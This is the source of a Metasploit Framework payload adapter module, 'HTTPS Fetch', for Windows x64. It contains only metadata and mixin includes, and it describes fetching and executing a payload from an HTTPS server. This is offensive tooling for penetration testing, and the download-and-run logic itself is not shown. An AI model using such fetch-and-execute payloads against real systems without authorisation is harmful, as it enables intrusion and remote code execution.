##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Adapter::Fetch::Https
  include Msf::Payload::Adapter::Fetch::WindowsOptions

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'HTTPS Fetch',
        'Description' => 'Fetch and Execute an x64 payload from an https server',
        'Author' => 'Brendan Watters',
        'Platform' => 'win',
        'Arch' => ARCH_CMD,
        'License' => MSF_LICENSE,
        'AdaptedArch' => ARCH_X64,
        'AdaptedPlatform' => 'win'
      )
    )
  end
end
